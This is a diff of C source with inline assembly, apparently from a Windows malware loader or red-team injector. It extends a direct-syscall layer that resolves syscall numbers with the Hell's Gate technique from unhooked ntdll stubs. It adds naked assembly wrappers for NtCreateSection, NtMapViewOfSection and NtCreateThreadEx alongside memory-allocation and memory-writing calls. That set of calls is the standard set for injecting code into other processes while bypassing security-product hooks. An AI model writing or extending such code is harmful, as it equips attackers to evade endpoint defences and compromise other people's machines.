@@ -49,19 +49,18 @@ static BOOL  g_sc_ready = FALSE;
 
 /* Names we need to resolve — must match SC_ID order */
 static const char * const sc_names[SC_COUNT] = {
-    "NtAllocateVirtualMemory",   /* SC_NtAllocateVirtualMemory */
-    "NtWriteVirtualMemory",      /* SC_NtWriteVirtualMemory    */
-    "NtProtectVirtualMemory",    /* SC_NtProtectVirtualMemory  */
-    "NtCreateThreadEx",          /* SC_NtCreateThreadEx        */
-    "NtClose",                   /* SC_NtClose                 */
-    "NtReadVirtualMemory",       /* SC_NtReadVirtualMemory     */
+    "NtAllocateVirtualMemory",   /* SSN_NtAllocateVirtualMemory  = 0 */
+    "NtWriteVirtualMemory",      /* SSN_NtWriteVirtualMemory     = 1 */
+    "NtProtectVirtualMemory",    /* SSN_NtProtectVirtualMemory   = 2 */
+    "NtCreateThreadEx",          /* SSN_NtCreateThreadEx         = 3 */
+    "NtClose",                   /* SSN_NtClose                  = 4 */
+    "NtReadVirtualMemory",       /* SSN_NtReadVirtualMemory      = 5 */
+    "NtCreateSection",           /* SSN_NtCreateSection          = 6 */
+    "NtMapViewOfSection",        /* SSN_NtMapViewOfSection       = 7 */
+    "NtUnmapViewOfSection",      /* SSN_NtUnmapViewOfSection     = 8 */
 };
 
-/* Pre-computed ROR13 hashes for the names above */
-/* Recompute with peb_hash_str() if names change  */
-static const DWORD sc_hashes[SC_COUNT] = {
-    0,0,0,0,0,0   /* filled at runtime by sc_init — avoids hard-coding */
-};
+/* (no pre-computed hash table — SSNs are resolved at runtime by sc_init) */
 
 
 /* ── Hell's Gate: read SSN from unhooked stub ───────────────────────────── */
@@ -259,7 +258,21 @@ NTSTATUS sc_syscall6(DWORD ssn, ...)
     );
 }
 
-/* sc_syscall11: syscall(ssn, a1..a11) — NtCreateThreadEx needs 11 */
+/* sc_syscall7: syscall(ssn, a1..a7) — NtCreateSection needs 7 */
+__attribute__((naked))
+NTSTATUS sc_syscall7(DWORD ssn, ...)
+{
+    __asm__ __volatile__(
+        SC_HEAD
+        "movq 0x30(%rsp), %rax\n\t"  "movq %rax, 0x28(%rsp)\n\t"  /* a5 */
+        "movq 0x38(%rsp), %rax\n\t"  "movq %rax, 0x30(%rsp)\n\t"  /* a6 */
+        "movq 0x40(%rsp), %rax\n\t"  "movq %rax, 0x38(%rsp)\n\t"  /* a7 */
+        "syscall\n\t"
+        "ret\n\t"
+    );
+}
+
+/* sc_syscall11: syscall(ssn, a1..a11) — NtCreateThreadEx / NtMapViewOfSection */
 __attribute__((naked))
 NTSTATUS sc_syscall11(DWORD ssn, ...)
 {
